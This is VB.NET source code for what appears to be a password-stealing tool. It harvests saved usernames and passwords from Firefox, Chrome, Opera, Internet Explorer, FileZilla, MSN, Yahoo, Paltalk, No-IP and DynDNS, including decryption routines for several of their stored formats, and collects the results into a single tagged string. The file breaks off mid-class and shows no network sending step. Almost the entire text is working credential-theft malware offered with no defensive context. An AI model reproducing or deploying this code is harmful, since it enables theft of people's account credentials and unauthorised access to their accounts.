Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Data
Imports System.Collections
Imports System.Collections.Generic

Public Class A
    Public Shared Function GT() As String
        OL = ""
        P1()
        P2()
        dyn()
        paltalk()
        GetFire()
        Chrome.Gchrome()
        Msn()
        Yahoo()
        GetOpera()
        Dim r = New CIE7Passwords
        r.Refresh()
        Return OL
    End Function
End Class

Module p

    Public Sub Yahoo()
        Try
            '    OL += vbNewLine & "###Yahoo" & vbNewLine
            For Each k As String In Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Yahoo\Profiles").GetSubKeyNames
                OL += "|URL| http://Yahoo.com" & vbNewLine & "|USR| " & k & vbNewLine & "|PWD| " & vbNewLine
            Next
        Catch ex As Exception
        End Try
    End Sub
    Public OL As String

#Region "MSN Password"
    <DllImport("advapi32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)> _
    Public Function CredEnumerateW(ByVal filter As String, ByVal flag As UInt32, <Out()> ByRef count As UInt32, <Out()> ByRef pCredentials As IntPtr) As Boolean
    End Function
    <StructLayout(LayoutKind.Sequential)> _
    Friend Structure CREDENTIAL
        Public Flags As Integer
        Public Type As Integer
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetName As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public Comment As String
        Public LastWritten As Long
        Public CredentialBlobSize As Integer
        Public CredentialBlob As IntPtr
        Public Persist As Integer
        Public AttributeCount As Integer
        Public Attributes As IntPtr
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetAlias As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public UserName As String
    End Structure
    Sub Msn()
        '  OL += vbNewLine & "###MSN" & vbNewLine
        Try
            Dim num As UInt32
            Dim zero As IntPtr = IntPtr.Zero
            If CredEnumerateW(("WindowsLive:name=" & "*"), 0, num, zero) Then
                Dim i As Integer
                For i = 0 To num - 1
                    Try
                        Dim s As String
                        OL += "|URL| http://hotmail.com" & vbNewLine
                        Dim credential As CREDENTIAL = DirectCast(Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, (IntPtr.Size * i)), GetType(CREDENTIAL)), CREDENTIAL)
                        OL += "|USR| " & credential.UserName & vbNewLine
                        Try
                            OL += "|PWD| " & Marshal.PtrToStringBSTR(credential.CredentialBlob) & vbNewLine

                        Catch ex As Exception
                            OL += "|PWD| " & vbNewLine
                        End Try
                    Catch ex As Exception
                    End Try
                Next i
            End If
        Catch ex As Exception
        End Try
    End Sub
#End Region
    Sub P1()   '===FileZilla
        Try
            '   OL += vbNewLine & "###FileZilla" & vbNewLine
            Dim O As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")


            For Each u As String In O
                Dim UU = Split(u, vbNewLine)
                For Each I As String In UU
                    If I.Contains("<Host>") Then
                        OL += "|URL| " & Split(Split(I, "<Host>")(1), "</Host>")(0) & vbNewLine
                    End If
                    '   If I.Contains("<Port>") Then
                    'OL += "PRT: " & Split(Split(I, "<Port>")(1), "</Port>")(0) & vbNewLine
                    'End If
                    If I.Contains("<User>") Then
                        OL += "|USR| " & Split(Split(I, "<User>")(1), "</User>")(0) & vbNewLine
                    End If
                    If I.Contains("<Pass>") Then
                        OL += "|PWD| " & Split(Split(I, "<Pass>")(1), "</Pass>")(0) & vbNewLine
                    End If
                Next
            Next
        Catch ex As Exception

        End Try

    End Sub
    Sub P2()  ' NO-IP
        Try
            '  OL += vbNewLine & "###NO-IP" & vbNewLine
            Dim s As String = "HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC"
            Dim U As String = Microsoft.Win32.Registry.GetValue(s, "USERname", "")
            Dim P As String = Microsoft.Win32.Registry.GetValue(s, "Password", "")
            If U = "" Then Exit Sub
            OL += "|URL| http://no-ip.com" & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & vbNewLine
        Catch c As Exception
        End Try
    End Sub
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Sub paltalk()
        Try
            '  OL += vbNewLine & "###Paltalk" & vbNewLine
            Dim ser() As Char = HWD.ToCharArray
            Dim reg As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim out As String = ""
            reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Paltalk")
            Dim users As String() = reg.GetSubKeyNames()
            reg.Close()
            For Each s As String In users
                Dim t, o, i, x As Integer
                Dim pass As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\Software\Paltalk\" & s, "pwd", "")
                Dim chr1 As Char() = pass.ToCharArray
                Dim passarr(pass.Length / 4) As String
                While t <= UBound(chr1) - 4
                    If t < UBound(chr1) - 4 Then
                        passarr(o) = chr1(t) & chr1(t + 1) & chr1(t + 2)
                    End If
                    t += 4
                    o += 1
                End While
                Dim key As String = ""
                For Each c As Char In s
                    key += c
                    If i <= UBound(ser) Then
                        key += ser(i)
                    End If
                    i = i + 1
                Next
                key = key & key & key
                Dim chr_arr As Char() = key.ToCharArray
                Dim blainpass As String = ""
                blainpass += Chr(passarr(0) - 122 - Asc(key.Substring(key.Length - 1, 1)))
                For x = 1 To UBound(passarr)
                    Dim tempchr As Char
                    If passarr(x) Is Nothing Then
                    Else
                        tempchr = Chr(passarr(x) - x - Asc(chr_arr(x - 1)) - 122)
                        blainpass += tempchr
                    End If
                Next x
                OL += "|URL| http://Paltalk.com" & vbNewLine & "|USR| " & s & vbNewLine & "|PWD| " & blainpass & vbNewLine

            Next
        Catch ex As Exception
        End Try
    End Sub
    Sub dyn()
        'DynDNS.com
        Try
            '  OL += vbNewLine & "###DynDNS" & vbNewLine
            Dim p = Replace(Environ("ALLUSERSPROFILE") & "\", "\\", "\")
            Dim pp = p & "DynDNS\Updater\config.dyndns"
            Dim usr As String
            Dim ps As String
            Dim pas As String
            Dim ii As Integer
            If IO.File.Exists(pp) = True Then
                Dim A As Array = IO.File.ReadAllLines(pp)
                For Each s As String In A
                    If InStr(s.ToLower, "username=") > 0 Then
                        usr = Split(s, "=")(1)
                    End If
                    If InStr(s.ToLower, "password=") > 0 Then
                        ps = Split(s, "=")(1)
                        For i = 1 To Len(ps) Step 2
                            pas = pas & Chr(Val("&H" & Mid(ps, i, 2)))
                        Next i
                        For i = 1 To Len(pas)
                            Mid(pas, i, 1) = Chr((Asc(Mid(pas, i, 1))) Xor (Asc(Mid("t6KzXhCh", ii + 1, 1))))
                            ii = ((ii + 1) Mod 8)
                        Next i
                        If usr.Length = 0 Then Exit Sub
                        OL += "|URL| http://DynDns.com" & vbNewLine & "|USR| " & usr & vbNewLine & "|PWD| " & pas & vbNewLine

                        Exit Sub
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
#Region "Opera"
    Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3, _
    &HE8, &H69, &H73, &HAF, &HFF}
    Private key_size As Byte() = {&H0, &H0, &H0, &H8}
    Private path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public DOutput As String
    Public Sub GetOpera()
        '  OL += vbNewLine & "###Opera" & vbNewLine
        If File.Exists(path & "\Opera\Opera\wand.dat") Then
            path += "\Opera\Opera\wand.dat"
        Else
            If File.Exists(path & "\Opera\Opera\profile\wand.dat") Then
                path += "\Opera\Opera\profile\wand.dat"
            End If
        End If
        Dim Q As String = ""

        Try
            Dim wand_file As Byte() = File.ReadAllBytes(path)
            Dim block_size As Integer = 0
            For i As Integer = 0 To wand_file.Length - 5
                If wand_file(i) = &H0 AndAlso wand_file(i + 1) = &H0 AndAlso wand_file(i + 2) = &H0 AndAlso wand_file(i + 3) = &H8 Then
                    block_size = CInt(wand_file(i + 15))
                    Dim key As Byte() = New Byte(7) {}
                    Dim encrypt_data As Byte() = New Byte(block_size - 1) {}
                    Array.Copy(wand_file, i + 4, key, 0, key.Length)
                    Array.Copy(wand_file, i + 16, encrypt_data, 0, encrypt_data.Length)
                    DOutput += decrypt2_method(key, encrypt_data) & vbNewLine
                    i += 11 + block_size
                End If
            Next
            Dim A As String() = Split(DOutput, vbNewLine)
            For i As Integer = 0 To A.Length - 1
                Dim w As String = FL(A(i))
                Dim url As String = ""
                Dim U As String = ""
                Dim P As String = ""
                If w.ToLower.StartsWith("http://") Or w.ToLower.StartsWith("https://") Then
                    url = w
                    If i + 2 < A.Length Then
                        For ii As Integer = i + 1 To i + 2
                            Dim xx As String = A(ii)
                            If xx.ToLower.StartsWith("http://") Or xx.ToLower.StartsWith("https://") Then
                                Exit For
                            End If
                            If ii = i + 2 Then
                                U = FL(xx)
                            End If
                        Next
                    End If
                    If i + 4 < A.Length Then
                        For ii As Integer = i + 1 To i + 4
                            Dim xx As String = A(ii)
                            If xx.ToLower.StartsWith("http://") Or xx.ToLower.StartsWith("https://") Then
                                Exit For
                            End If
                            If ii = i + 4 Then
                                P = FL(xx)
                            End If
                        Next
                    End If
                    OL += "|URL| " & url & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & vbNewLine

                End If
            Next
        Catch ex As Exception
        End Try
    End Sub
    Function FL(ByVal s As String) As String
        Dim f As String = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+="
        Dim w As String = ""
        For Each xx As String In s
            If f.Contains(xx.ToLower) Then
                w &= xx
            End If
        Next
        Return w
    End Function
    Public Function decrypt2_method(ByVal key As Byte(), ByVal encrypt_data As Byte())
        Try
            Dim md5Crypt As New MD5CryptoServiceProvider()
            md5Crypt.Initialize()
            Dim tmpBuffer As Byte() = New Byte(opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(opera_salt, tmpBuffer, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, opera_salt.Length, key.Length)
            Dim hash1 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
            tmpBuffer = New Byte(hash1.Length + opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(hash1, tmpBuffer, hash1.Length)
            Array.Copy(opera_salt, 0, tmpBuffer, hash1.Length, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, hash1.Length + opera_salt.Length, key.Length)
            Dim hash2 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
            Dim tripleDES As New TripleDESCryptoServiceProvider()
            tripleDES.Mode = CipherMode.CBC
            tripleDES.Padding = PaddingMode.None
            Dim tripleKey As Byte() = New Byte(23) {}
            Dim IV As Byte() = New Byte(7) {}
            Array.Copy(hash1, tripleKey, hash1.Length)
            Array.Copy(hash2, 0, tripleKey, hash1.Length, 8)
            Array.Copy(hash2, 8, IV, 0, 8)
            tripleDES.Key = tripleKey
            tripleDES.IV = IV
            Dim decryter As ICryptoTransform = tripleDES.CreateDecryptor()
            Dim output As Byte() = decryter.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length)
            Dim enc As String = Encoding.Unicode.GetString(output)
            Return enc
        Catch e As Exception
            Return ""
        End Try
    End Function
#End Region
End Module
#Region "FireFox"
Module firefox5
    Public Function GetFire() As String
        '  OL += vbNewLine & "###FireFox" & vbNewLine
        Try
            Dim FoundFile As Boolean = False
            Dim KeySlot As Long = 0
            Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
            Dim DefaultPath As String = Environment.GetEnvironmentVariable("APPDATA") & "\Mozilla\Firefox\Profiles"
            Dim Dirs As String() = IO.Directory.GetDirectories(DefaultPath)
            For Each dir As String In Dirs
                If Not FoundFile Then
                    Dim Files As String() = IO.Directory.GetFiles(dir)
                    For Each CurrFile As String In Files
                        If Not FoundFile Then
                            If System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite") Then
                                NSS_Init(dir)
                                signon = CurrFile
                            End If
                        Else

                            Exit For
                        End If
                    Next
                Else
                    Exit For
                End If
            Next

            Dim dataSource As String = signon
            Dim tSec As New TSECItem()
            Dim tSecDec As New TSECItem()
            Dim tSecDec2 As New TSECItem()
            Dim bvRet As Byte()
            Dim db As New SQLiteBase5(dataSource)

            Dim table As System.Data.DataTable = db.ExecuteQuery("SELECT * FROM moz_logins;")
            Dim table2 As System.Data.DataTable = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;")
            For Each row As System.Data.DataRow In table2.Rows
            Next
            KeySlot = PK11_GetInternalKeySlot()
            PK11_Authenticate(KeySlot, True, 0)

            For Each Zeile As System.Data.DataRow In table.Rows
                Dim formurl As String = System.Convert.ToString(Zeile("formSubmitURL").ToString())
                Dim url As String = formurl
                Dim usr As String = ""
                Dim pw As String = ""
                Dim se As New StringBuilder(Zeile("encryptedUsername").ToString())
                Dim hi2 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length)
                Dim item As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi2), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then
                    If tSecDec.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen)
                        usr = System.Text.Encoding.UTF8.GetString(bvRet)
                    End If
                End If
                Dim se2 As New StringBuilder(Zeile("encryptedPassword").ToString())
                Dim hi22 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length)
                Dim item2 As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi22), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item2, tSecDec2, 0) = 0 Then
                    If tSecDec2.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec2.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen)
                        pw = System.Text.Encoding.UTF8.GetString(bvRet)
                    End If
                End If
                OL += "|URL| " & url & vbNewLine & "|USR| " & usr & vbNewLine & "|PWD| " & pw & vbNewLine

            Next
        Catch ex As Exception
        End Try
    End Function
    Public Class SHITEMID
        Public Shared cb As Long
        Public Shared abID As Byte()
    End Class
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As Integer
        Public SECItemLen As Integer
    End Structure

    <DllImport("kernel32.dll")> _
    Private Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function
    Private NSS3 As IntPtr
    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> _
    Private Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    Public Function NSS_Init(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        LoadLibrary(MozillaPath & "mozutils.dll") 'DODANO
        LoadLibrary(MozillaPath & "mozglue.dll")
        LoadLibrary(MozillaPath & "mozcrt19.dll")
        LoadLibrary(MozillaPath & "nspr4.dll")
        LoadLibrary(MozillaPath & "plc4.dll")
        LoadLibrary(MozillaPath & "plds4.dll")
        LoadLibrary(MozillaPath & "ssutil3.dll")
        LoadLibrary(MozillaPath & "mozsqlite3.dll")
        LoadLibrary(MozillaPath & "nssutil3.dll")
        LoadLibrary(MozillaPath & "softokn3.dll")
        NSS3 = LoadLibrary(MozillaPath & "nss3.dll")
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSS_Init")
        Dim dll As DLLFunctionDelegate = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
        Return dll(configdir)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate2() As Long
    Public Function PK11_GetInternalKeySlot() As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_GetInternalKeySlot")
        Dim dll As DLLFunctionDelegate2 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate2)), DLLFunctionDelegate2)
        Return dll()
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
    Public Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_Authenticate")
        Dim dll As DLLFunctionDelegate3 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate3)), DLLFunctionDelegate3)
        Return dll(slot, loadCerts, wincx)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    Public Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer")
        Dim dll As DLLFunctionDelegate4 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate4)), DLLFunctionDelegate4)
        Return dll(arenaOpt, outItemOpt, inStr, inLen)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
    Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function
    Public signon As String
    Public Class SQLiteBase5
        <DllImport("kernel32")> _
        Private Shared Function HeapAlloc(ByVal heap As IntPtr, ByVal flags As UInt32, ByVal bytes As UInt32) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function GetProcessHeap() As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function lstrlen(ByVal str As IntPtr) As Integer
        End Function
        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_open(ByVal fileName As IntPtr, ByRef database As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_close(ByVal database As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_exec(ByVal database As IntPtr, ByVal query As IntPtr, ByVal callback As IntPtr, ByVal arguments As IntPtr, ByRef [error] As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_errmsg(ByVal database As IntPtr) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_prepare_v2(ByVal database As IntPtr, ByVal query As IntPtr, ByVal length As Integer, ByRef statement As IntPtr, ByRef tail As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_step(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_count(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_type(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_int(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_double(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Double
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_text(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_blob(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_table_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_finalize(ByVal handle As IntPtr) As Integer
        End Function

        ' SQLite constants
        Private Const SQL_OK As Integer = 0
        Private Const SQL_ROW As Integer = 100
        Private Const SQL_DONE As Integer = 101
        Public Enum SQLiteDataTypes
            INT = 1
            FLOAT
            TEXT
            BLOB
            NULL
        End Enum
        Private database As IntPtr
        Public Sub New()
            database = IntPtr.Zero
        End Sub
        Public Sub New(ByVal baseName As [String])
            OpenDatabase(baseName)
        End Sub
        Public Sub OpenDatabase(ByVal baseName As [String])
            If sqlite3_open(StringToPointer(baseName), database) <> SQL_OK Then
                database = IntPtr.Zero
                '   Throw New Exception("Error with opening database " & baseName & "!")
            End If
        End Sub
        Public Sub CloseDatabase()
            If database <> IntPtr.Zero Then
                sqlite3_close(database)
            End If
        End Sub
        Public Function GetTables() As ArrayList
            Dim query As [String] = "SELECT name FROM sqlite_master " & "WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'" & "UNION ALL " & "SELECT name FROM sqlite_temp_master " & "WHERE type IN ('table','view') " & "ORDER BY 1"
            Dim table As System.Data.DataTable = ExecuteQuery(query)
            Dim list As New ArrayList()
            For Each row As System.Data.DataRow In table.Rows
                list.Add(row.ItemArray(0).ToString())
            Next
            Return list
        End Function
        Public Sub ExecuteNonQuery(ByVal query As [String])
            Dim [error] As IntPtr
            sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, [error])
            If [error] <> IntPtr.Zero Then
                ' Throw New Exception(("Error with executing non-query: """ & query & """!") + PointerToString(sqlite3_errmsg([error])))
            End If
        End Sub
        Public Function ExecuteQuery(ByVal query As [String]) As System.Data.DataTable
            Dim statement As IntPtr
            Dim excessData As IntPtr
            sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), statement, excessData)
            Dim table As New System.Data.DataTable()
            Dim result As Integer = ReadFirstRow(statement, table)
            While result = SQL_ROW
                result = ReadNextRow(statement, table)
            End While
            sqlite3_finalize(statement)
            Return table
        End Function
        Private Function ReadFirstRow(ByVal statement As IntPtr, ByRef table As System.Data.DataTable) As Integer
            table = New System.Data.DataTable("resultTable")
            Dim resultType As Integer = sqlite3_step(statement)
            If resultType = SQL_ROW Then
                Dim columnCount As Integer = sqlite3_column_count(statement)
                Dim columnName As [String] = ""
                Dim columnType As Integer = 0
                Dim columnValues As Object() = New Object(columnCount - 1) {}
                For i As Integer = 0 To columnCount - 1
                    columnName = PointerToString(sqlite3_column_name(statement, i))
                    columnType = sqlite3_column_type(statement, i)
                    Select Case columnType
                        Case CInt(SQLiteDataTypes.INT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Int32"))
                                columnValues(i) = sqlite3_column_int(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.FLOAT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Single"))
                                columnValues(i) = sqlite3_column_double(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.TEXT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.BLOB)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                                Exit Select
                            End If
                        Case Else
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = ""
                                Exit Select
                            End If
                    End Select
                Next
                table.Rows.Add(columnValues)
            End If
            Return sqlite3_step(statement)
        End Function
        Private Function ReadNextRow(ByVal statement As IntPtr, ByRef table As System.Data.DataTable) As Integer
            Dim columnCount As Integer = sqlite3_column_count(statement)

            Dim columnType As Integer = 0
            Dim columnValues As Object() = New Object(columnCount - 1) {}

            For i As Integer = 0 To columnCount - 1
                columnType = sqlite3_column_type(statement, i)

                Select Case columnType
                    Case CInt(SQLiteDataTypes.INT)
                        If True Then
                            columnValues(i) = sqlite3_column_int(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.FLOAT)
                        If True Then
                            columnValues(i) = sqlite3_column_double(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.TEXT)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.BLOB)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                            Exit Select
                        End If
                    Case Else
                        If True Then
                            columnValues(i) = ""
                            Exit Select
                        End If
                End Select
            Next
            table.Rows.Add(columnValues)
            Return sqlite3_step(statement)
        End Function
        Private Function StringToPointer(ByVal str As [String]) As IntPtr
            If str Is Nothing Then
                Return IntPtr.Zero
            Else
                Dim encoding__1 As Encoding = Encoding.UTF8
                Dim bytes As [Byte]() = encoding__1.GetBytes(str)
                Dim length As UInteger = bytes.Length + 1
                Dim pointer As IntPtr = HeapAlloc(GetProcessHeap(), 0, CType(length, UInt32))
                Marshal.Copy(bytes, 0, pointer, bytes.Length)
                Marshal.WriteByte(pointer, bytes.Length, 0)
                Return pointer
            End If
        End Function
        Private Function PointerToString(ByVal ptr As IntPtr) As [String]
            If ptr = IntPtr.Zero Then
                Return Nothing
            End If

            Dim encoding__1 As Encoding = Encoding.UTF8

            Dim length As Integer = GetPointerLenght(ptr)
            Dim bytes As [Byte]() = New [Byte](length - 1) {}
            Marshal.Copy(ptr, bytes, 0, length)
            Return encoding__1.GetString(bytes, 0, length)
        End Function
        Private Function GetPointerLenght(ByVal ptr As IntPtr) As Integer
            If ptr = IntPtr.Zero Then
                Return 0
            End If
            Return lstrlen(ptr)
        End Function
    End Class
End Module
#End Region
#Region "Chrome"
Module Chrome


    Sub Gchrome()
        '  OL += vbNewLine & "###Chrome" & vbNewLine
        Try
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")
            If File.Exists(datapath) Then
                Dim host, user, pass As String
                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, "origin_url")
                    user = SQLDatabase.GetValue(i, "username_value")
                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
                    If (user <> "") And (pass <> "") Then
                        OL += "|URL| " & host & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & pass & vbNewLine

                    End If
                Next
            End If
        Catch ex As Exception
        End Try

    End Sub
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Function Decrypt(ByVal Datas() As Byte) As String
        Dim inj, Ors As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = Encoding.Default.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function

End Module
Public Class SQLiteHandler
    Private db_bytes() As Byte
    Private page_size As UInt16
    Private encoding As UInt64
    Private master_table_entries() As sqlite_master_entry

